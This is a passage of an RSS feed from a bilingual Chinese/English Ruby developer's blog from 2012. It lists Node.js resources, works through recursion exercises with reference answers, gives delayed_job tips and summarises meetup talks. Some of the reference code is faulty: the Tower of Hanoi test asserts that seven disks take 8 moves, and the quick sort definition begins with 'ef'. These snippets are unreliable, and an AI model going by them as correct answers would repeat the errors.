&lt;li&gt;&lt;a href="http://vimeo.com/18077379" rel="nofollow"&gt;Server-side JavaScript with Node, Connect &amp;amp; Express&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lynda.com/Nodejs-tutorials/Nodejs-First-Look/101554-2.html" rel="nofollow"&gt;Node.js First Look&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Screencasts&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nodetuts.com/" rel="nofollow"&gt;NodeTuts&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nodecasts.net/" rel="nofollow"&gt;NodeCasts&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Books&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nodebeginner.org/" rel="nofollow"&gt;The Node Beginner Book&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://visionmedia.github.com/masteringnode/" rel="nofollow"&gt;Mastering Node.js&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ofps.oreilly.com/titles/9781449398583/index.html" rel="nofollow"&gt;Up and Running with Node.js&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.manning.com/cantelon/" rel="nofollow"&gt;Node.js in Action&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Blogs&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.nodejs.org/" rel="nofollow"&gt;Ryan Dahl's Node blog&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://howtonode.org/" rel="nofollow"&gt;How To Node&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dailyjs.com/" rel="nofollow"&gt;DailyJS&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.nodejitsu.com/" rel="nofollow"&gt;Nodejitsu blog&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Podcasts&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nodeup.com/" rel="nofollow"&gt;NodeUp&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;JavaScript resources&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://yuiblog.com/crockford/" rel="nofollow"&gt;Crockford's videos&lt;/a&gt; (must see!)&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.addyosmani.com/resources/essentialjsdesignpatterns/book/" rel="nofollow"&gt;Essential JavaScript Design Patterns For Beginners&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bonsaiden.github.com/JavaScript-Garden/" rel="nofollow"&gt;JavaScript garden&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://oreilly.com/catalog/9780596806767" rel="nofollow"&gt;JavaScript Patterns&lt;/a&gt; book&lt;/li&gt;
&lt;li&gt;&lt;a href="http://oreilly.com/catalog/9780596517748/" rel="nofollow"&gt;JavaScript: The Good Parts&lt;/a&gt; book&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Node Modules&lt;/strong&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/joyent/node/wiki/modules" rel="nofollow"&gt;Wiki List on Github/Joyent/Node&lt;/a&gt; (start here last!)&lt;/li&gt;
&lt;li&gt;&lt;a href="http://search.npmjs.org/" rel="nofollow"&gt;Search for registered node.js modules&lt;/a&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;</description>
      <pubDate>Sun, 19 Aug 2012 00:24:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/node-js-tutorial</link>
    </item>
    <item>
      <title>递归函数练习题 (recursive function exams) </title>
      <description>&lt;p&gt;递归函数非常重要。在解决很多实际问题中，在大学课程中，以及很多面试过程中，都要被用到。可以说是计算机的基础。自己之前做WEB开发，没有太重视，所以做一些补习 ^_^&amp;#160;&lt;/p&gt;
&lt;p&gt;Recursive function is the basic and the most important of computer science, and it is widely used in solving real problems, college education (basic courses), and in the interviews for a programmer job. &amp;#160;so, let's have some exams for it. &amp;#160;&lt;/p&gt;
&lt;h1&gt;1. factorial . &amp;#160;(阶乘）&lt;/h1&gt;
&lt;p&gt;given n = 3. should get result = 3x2x1 = 6&lt;br /&gt;given n = 5, should get result = 5x4x3x2x1&amp;#160;&lt;/p&gt;
&lt;p&gt;参考答案： (answer)&lt;/p&gt;
&lt;pre&gt;def factorial n
  return 1 if n == 1
  return factorial(n-1) * n 
end
&lt;/pre&gt;
&lt;h1&gt;2. fabonacci numbers: &amp;#160; (fabonacci 数列）&amp;#160; 0, 1, 1, 2, 3, 5, 8, 13 ......&lt;/h1&gt;
&lt;p&gt;参考答案：(answer)&lt;/p&gt;
&lt;pre&gt;# 0, 1, 1, 2, 3, 5, 8, 13
def fabonacci n
  return 0 if n == 0
  return 1 if n == 1
  return fabonacci(n-1) + fabonacci(n-2)
end
def get_array n
  result = []
  n.times.to_a.reverse.each { |i| result &amp;lt;&amp;lt; fabonacci(i) }
  return result
end
puts "fabonacci 8: #{fabonacci(8).inspect}"    
puts "fabonacci 8(array): #{get_array(8).inspect}"
&lt;/pre&gt;
&lt;p&gt;以上代码的输出：&lt;/p&gt;
&lt;pre&gt;fabonacci 8: 21
fabonacci 8(array): [13, 8, 5, 3, 2, 1, 1, 0]
&lt;/pre&gt;
&lt;p&gt;( 一个非常有趣的现象是： 越到后来， 两个相邻fabonacci的比值越接近黄金分割。例如： fab(19)/fab(20) =&amp;#160;0.618033985017358 &amp;#160; )&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmIjEyMDEyLzA4LzE3LzExXzA0XzA4XzcyOF9maWJvbmFjY2lfc3BpcmFsLmdpZlsIOgZwOgp0aHVtYiINNDUweDQ1MD4/fibonacci-spiral.gif" title="Fibonacci Spiral" alt="Fibonacci Spiral" rel="450x450" height="280" width="450" /&gt;&lt;/p&gt;
&lt;h1&gt;3. 最大公约数（greatest common divisor) &amp;#160; &amp;#160;&lt;/h1&gt;
&lt;p&gt;例如： 54 = 54 x 1 = 27 x 2 = 18 x 3 = 9 x 6 , &amp;#160; thus the divisors of 54 are: &amp;#160;[ 1,2,3,6,9,18,27,54]&lt;br /&gt;同样： 24 's divisors : [1,2,3,4,6,8,12,24]&lt;br /&gt;the common divisors : &amp;#160;[1,2,3,6]&amp;#160;&lt;br /&gt;so , the greatest common divisor : &amp;#160;gcd(54,24) = 6&lt;/p&gt;
&lt;pre&gt;# need a &amp;gt; b
def get_greatest_common_divisors_simplest(a, b)
  return a if b == 0
  get_greatest_common_divisors_simplest(b, a%b)
end

require 'test/unit'
class DivisorsTest &amp;lt; Test::Unit::TestCase
  def test_get_greatest_common_divisors_simplest
    assert_equal 6, get_greatest_common_divisors_simplest(54, 24) 
  end 
end
&lt;/pre&gt;
&lt;h1&gt;4. Tower of Hanoi&amp;#160;&lt;/h1&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbB1sHOgZmIi8yMDEyLzA4LzE3LzE0XzA5XzUwXzU3NF90b3dlcl9vZl9oYW5vaS5naWZbCDoGcDoKdGh1bWIiDTQ1MHg0NTA+/tower_of_hanoi.gif" title="Tower Of Hanoi" alt="Tower Of Hanoi" rel="450x450" height="117" width="300" /&gt;&lt;/p&gt;
&lt;p&gt;简单的说，就是计算把若干盘子从一个柱子保持原有顺序的转移到另一个柱子所需要的步骤。&lt;/p&gt;
&lt;p&gt;given three pegs, one with a set of N disks of increasing size, determine the minimum (optimal) number of steps it takes to move all the disks from their initial position to another peg without placing a larger disk on top of a smaller one.&lt;/p&gt;
&lt;pre&gt;# see: http://en.wikipedia.org/wiki/Towers_of_Hanoi
def hanoi(n)
  return 1 if n == 1
  return 2 * hanoi( n -1) + 1 
end

require 'test/unit'
class HanoiTest &amp;lt; Test::Unit::TestCase
  def test_hanoi
    assert_equal 15, hanoi(4)
    assert_equal 8, hanoi(7)
  end 
end&lt;/pre&gt;
&lt;h1&gt;5. （快速排序算法）Quick Sort &lt;/h1&gt;
&lt;p&gt;&lt;img rel="450x450" alt="Sorting Quicksort Anim" title="Sorting Quicksort Anim" src="/system/images/BAhbB1sHOgZmIjcyMDEyLzA4LzI3LzE1XzExXzE0XzQzNl9Tb3J0aW5nX3F1aWNrc29ydF9hbmltLmdpZlsIOgZwOgp0aHVtYiINNDUweDQ1MD4/Sorting_quicksort_anim.gif" height="214" width="280" /&gt;&lt;/p&gt;
&lt;p&gt;对一个数组进行排序，先选定一个 pivot （中间数），然后把低于这个中间数的数组元素放到less 数组中，高于它的，放在 greater数组中。 接下来，重复这个过程，对less和 greater进行迭代.  (sort an array using pivot, and patition.  It first divide a large list into 2 smaller lists: less and greater, then sort them recursively ) &lt;/p&gt;
&lt;p&gt; 问题的核心在于： 1. 对数组进行分区 . 2. 递归重复排序的过程。3. 使用2个空的数组来保存排序结果。 ( the core of the problem is: 1. partition.  2 recursively sort. 3. declare blank arrays to store the sorted sub lits )&lt;/p&gt;
&lt;pre&gt;ef quick_sort(array)
  if array.size &amp;lt; 2
    #puts "array size == 1: #{array.inspect}"
    return array
  end
  # find the pivot
  pivot, array  = parition(array)
  # now let's sort...
  less, greater  = [], []
  # divide the array by pivot (partition)
  array.each { |e| e &amp;lt;= pivot ? less &amp;lt;&amp;lt; e : greater &amp;lt;&amp;lt; e }
  sorted_array = less + [pivot] + greater
  #puts "after sort,: #{sorted_array.inspect}, less: #{less.inspect}, greater: #{greater.inspect}"
  return quick_sort(less) + [pivot] + quick_sort(greater)
end
def parition(array)
  #puts "find pivot from array: #{array.inspect}"
  index = array.size / 2
  pivot = array.delete_at(index)
  #puts "index: #{index}, value: #{array[index]}, array: #{array.inspect}"

  return [pivot, array]
end

# call it: &lt;br /&gt;quick_sort(Range.new(1, 1e4).to_a.shuffle)  # Finished in 0.20154 seconds&lt;br /&gt;quick_sort(Range.new(1, 1e5).to_a.shuffle)  # Finished in 2.58 seconds
&lt;/pre&gt;</description>
      <pubDate>Fri, 17 Aug 2012 02:17:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/recursive-functions</link>
    </item>
    <item>
      <title>参加了ruby-beijing 7月的聚会( Joined Ruby Beijing Party on July)</title>
      <description>&lt;p&gt;7月21号，下着大雨，我去晚了。 结果林生让我去说两句。。。只好跟大家聊聊工作，说说养生。呼呼。。。&lt;/p&gt;


&lt;p&gt;傻乎乎的照片一张，自己最近实在太瘦了：&lt;/p&gt;
&lt;p&gt;&lt;img rel="450x450" alt="Dsc 0091" title="Dsc 0091" src="/system/images/BAhbB1sHOgZmIikyMDEyLzA4LzEzLzA4XzQ4XzI1XzM4Ml9EU0NfMDA5MS5KUEdbCDoGcDoKdGh1bWIiDTQ1MHg0NTA+/DSC_0091.JPG" height="450" width="299" /&gt;&lt;/p&gt;
&lt;p&gt;来个合影：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" href="http://ww4.sinaimg.cn/large/a403844dgw1dvg95jsqm0j.jpg"&gt;&lt;img rel="450x450" alt="A403844dgw1dvg95jsqm0j" title="A403844dgw1dvg95jsqm0j" src="/system/images/BAhbB1sHOgZmIjcyMDEyLzA4LzEzLzA4XzQzXzQwXzkzOV9hNDAzODQ0ZGd3MWR2Zzk1anNxbTBqLmpwZ1sIOgZwOgp0aHVtYiINNDUweDQ1MD4/a403844dgw1dvg95jsqm0j.jpg" height="299" width="450" /&gt;&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Mon, 13 Aug 2012 00:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruby-beijing-party-july-07</link>
    </item>
    <item>
      <title>gmail 中的快捷键. ( shortcuts of Gmail)</title>
      <description>&lt;p&gt;在这里：&lt;a href="http://support.google.com/mail/bin/answer.py?hl=en&amp;amp;answer=6594" title="http://support.google.com/mail/bin/answer.py?hl=en&amp;amp;answer=6594" target="_blank"&gt;http://support.google.com/mail/bin/answer.py?hl=en&amp;amp;answer=6594&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;一定要用快捷键，不管是编程，打游戏（WAR3， DOTA） ， 还是使用GMAIL。 大幅提高手术和效率。。。&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sun, 12 Aug 2012 22:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/shortcuts-of-gmail</link>
    </item>
    <item>
      <title>delayed_job 需要注意的几个地方( advanced usage of delayed_job ) </title>
      <description>&lt;p&gt;delayed_job是非常强大的工具。但是，它也有它适应的场合。用的好的话，非常给力。用的不好的话，就麻烦了。 ( delayed_job is a good tool, but we should be clear how it should be used)&amp;#160;&lt;/p&gt;
&lt;p&gt;适合的场合： &lt;br /&gt;1. 有很多任务需要处理，这些任务可以延迟一段时间完成，例如：发送1W个EMAIL。 更新10W个设备的信息。等。&lt;br /&gt;2. 各个任务之间没有复杂的联系，哪个先来，哪个后来，没有固定的需求。&lt;br /&gt;3. （最好不要出现这个情况）有的话也可以，但是一定要简单！ 例如： 100个任务中，前50个优先级高，先执行。&amp;#160;&lt;/p&gt;
&lt;p&gt;不适合的场合：( un-fitted scenario: the tasks should be run in a complicated sequence with different priorities)&amp;#160;&lt;br /&gt;1. 有严格的优先级（有复杂的先后顺序）&lt;/p&gt;
&lt;p&gt;这几天在项目中有非常深刻的体会：&lt;/p&gt;
&lt;p&gt;1. delayed_job 属于并发执行，所以冒出来很多意想不到的问题。&lt;/p&gt;
&lt;p&gt;2. delayed_job 使用了独立于rails的脚本执行（script/delayed_job start) 所以无法使用单元测试。&amp;#160; 难于测试，就难于开发。&lt;/p&gt;
&lt;p&gt;3. 不是按照我想象的严格遵守优先级。 例如：&amp;#160; 10 个worker,&amp;#160; 遇到5个任务： &lt;br /&gt;&lt;br /&gt;job1:  priority = 0&lt;br /&gt;job2:  priority = 0&lt;br /&gt;job3:  priority = 10&lt;br /&gt;job4:  priority = 20&lt;br /&gt;job5:  priority = 30&lt;br /&gt;&lt;br /&gt;尽管它们的优先级不同，但是，由于有 10 个worker在待命，所以， 这5个job会被同时执行。T.T&lt;/p&gt;
&lt;p&gt;4. 要解决这个问题，我使用了 wait_job.rb 但是效果极差。大家不要参考了。
&lt;/p&gt;
&lt;pre&gt;  1 # a job just for waiting the preconditional jobs (higher priority jobs) done
  2 class WaitUntilPreconditionalsDoneJob &amp;lt; Struct.new(:priority)
  3   include DelayedJobPriority
  4   def perform
  5     wait_until_higher_priority_jobs_done(priority)
  6   end
  7 end
&lt;/pre&gt;
&lt;p&gt;接上文，要解决这个问题，只能使用 before/after hooks. 例如：
&lt;/p&gt;
&lt;pre&gt;  1 # usage:
  2 # Delayed::Job.enqueue(UpdateRemoteConflictingDeviceInfoJob.new(), 10)
  3 class UpdateRemoteConflictingDeviceInfoJob &amp;lt; Struct.new(:device_group, :cloudset)
  4   def before(job)
  5     Rails.logger.info '=== before UpdateRemoteConflictingDeviceInfoJob'
  6   end 
  7   def perform
  8     device_group.update_the_remote_conflicting_devices(cloudset)
  9   end
 10     
 11   def after(job)
 12     Rails.logger.info '=== in after hook, now starts UpdateLocalEmailsByRemoteValueJob'
 13     Delayed::Job.enqueue(UpdateLocalEmailsByRemoteValueJob.new(device_group), :priority =&amp;gt; 20)
 14   end   
&lt;/pre&gt;
</description>
      <pubDate>Sun, 12 Aug 2012 22:43:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/something-about-delayed-job</link>
    </item>
    <item>
      <title>演讲：meta-programming ruby </title>
      <description>&lt;p&gt;8月11日参加了 &lt;a href="http://ruby-china.org/topics/4662" title="http://ruby-china.org/topics/4662" target="_blank"&gt;ruby-china.org 组织的 RUBY 聚会&lt;/a&gt;，地点在盛大创新院。&lt;/p&gt;
&lt;p&gt;我做了 meta programming ruby 的演讲。大概的讲述了 ruby中的 model diagram, self, 等一些概念，以及一些meta programming 的基本方法。&lt;/p&gt;
&lt;p&gt;&lt;a href="/system/resources/BAhbBlsHOgZmIjYyMDEyLzA4LzExLzEwXzIyXzIzXzQ4N19tZXRhX3Byb2dyYW1taW5nX3J1YnkucHB0/meta_programming_ruby.ppt" title="Meta Programming Ruby"&gt;PPT 在这里&lt;/a&gt;。 &amp;#160; 或者其他格式： &amp;#160;&amp;#160;&lt;a href="/system/resources/BAhbBlsHOgZmIjYyMDEyLzA4LzExLzEwXzIyXzEyXzE0MV9tZXRhX3Byb2dyYW1taW5nX3J1Ynkub2Rw/meta_programming_ruby.odp" title="Meta Programming Ruby"&gt;ODP&lt;/a&gt;， &amp;#160;&lt;a href="/system/resources/BAhbBlsHOgZmIjYyMDEyLzA4LzExLzEwXzIxXzM0XzgzN19tZXRhX3Byb2dyYW1taW5nX3J1YnkucGRm/meta_programming_ruby.pdf" title="Meta Programming Ruby"&gt;PDF&lt;/a&gt;
&lt;/p&gt;
&lt;img src="/system/images/BAhbB1sHOgZmIjQyMDEyLzA4LzE3LzEwXzE0XzEzXzcxOF9zaXdlaV9zcGVha2luZ19tZXRhLnBuZ1sIOgZwOgp0aHVtYiINNDUweDQ1MD4/siwei_speaking_meta.png" title="Siwei Speaking Meta" alt="Siwei Speaking Meta" rel="450x450" width="373" height="368" /&gt;
&lt;p&gt;&lt;a href="/system/resources/BAhbBlsHOgZmIjYyMDEyLzA4LzExLzEwXzIyXzIzXzQ4N19tZXRhX3Byb2dyYW1taW5nX3J1YnkucHB0/meta_programming_ruby.ppt" title="Meta Programming Ruby"&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;这里是&lt;a href="/system/resources/BAhbBlsHOgZmIkEyMDEyLzA4LzE1LzA2XzU3XzIyXzE0Nl8xXzIwMTIwODExX21ldGFfcnVieV9wcm9ncmFtbWluZy5tcDM/1-20120811-meta%20ruby%20programming.mp3" title="1 20120811 Meta Ruby Programming"&gt;当时的MP3 录音。 (48'50'')&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/sg552/meta_ruby"&gt; 这里还有可以运行的代码例子。&lt;/a&gt;(github)&lt;/p&gt;
&lt;p&gt;&lt;a title="Spells" href="/system/resources/BAhbBlsHOgZmIicyMDEyLzA4LzEwLzE0XzEzXzU3XzUzMF9zcGVsbHMucGRm/spells.pdf"&gt;这里是一个包含了所有&amp;#160; spell的 PDF&lt;/a&gt;&amp;#160;.&amp;#160;&lt;/p&gt;
</description>
      <pubDate>Sat, 11 Aug 2012 23:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/meta-programming-ruby</link>
    </item>
    <item>
      <title>barcamp演讲：ruby 中的单元测试(something about unit tests in Ruby)</title>
      <description>&lt;p&gt;8月5号，我参加了 &lt;a href="http://www.barcamp-beijing.com/barcamp-beijing-august-2012/" title="http://www.barcamp-beijing.com/barcamp-beijing-august-2012/" target="_blank"&gt;barcamp &lt;/a&gt;活动， 进行了 ruby中的单元测试这个演讲。讲述一些单元测试的基本方法，rpsec 中的 mock , stub , 某些大型系统中的测试框架和技巧。最后的提问环节很有意思，很多朋友都提出了关于创业啊，或者寻找程序员好手的想法，&lt;a href="http://ruby-china.org" title="http://ruby-china.org" target="_blank"&gt;ruby-china&lt;/a&gt; 的石川(shichuan)、文洋、林生以及好几位朋友也到了场。&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;a title="Unit Tests In Ruby" href="/system/resources/BAhbBlsHOgZmIjMyMDEyLzA4LzEwLzEzXzU5XzEzXzE1Nl91bml0X3Rlc3RzX2luX3J1Ynkub2Rw/unit_tests_in_ruby.odp"&gt;PPT在这里&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;单元测试中的几个术语：&amp;#160;&lt;/p&gt;
&lt;p&gt;double:  the generic term for any kind of pretend object used in place of areal object for testing purpose. 是一种通用的称呼，来指： 所有用于替换真实对象的组建。 &lt;/p&gt;
&lt;p&gt;Dummy: 空对象，啥都不做。仅仅用于某些parameter的占位（ fill parameter lists) &lt;/p&gt;
&lt;p&gt;Fake : 能用，但是不适合生产环境，例如：  in memory database. &lt;/p&gt;
&lt;p&gt;Stubs:  对某个方法的模拟调用，它返回的值是被我们预先设定的。 &lt;/p&gt;
&lt;p&gt;Mocks:  某个模拟用的对象，替换真实存在的对象。 &lt;/p&gt;
&lt;p&gt;大家的合影(我妈妈也在里面哈哈）：&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.barcamp-beijing.com/wp-content/uploads/2012/08/00-Group-Shot.jpg"&gt;&lt;img src="/system/images/BAhbB1sHOgZmIjQyMDEyLzA4LzEzLzA2XzM5XzEwXzI2N19iYXJfY2FtcF9ncm91cF9zaG93LmpwZ1sIOgZwOgp0aHVtYiINNDUweDQ1MD4/bar_camp_group_show.jpg" title="Bar Camp Group Show" alt="Bar Camp Group Show" rel="450x450" width="450" height="304" /&gt;&lt;/a&gt;
&lt;/p&gt;

</description>
      <pubDate>Sun, 05 Aug 2012 20:30:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/unit-tests-in-ruby</link>
    </item>
  </channel>
</rss>
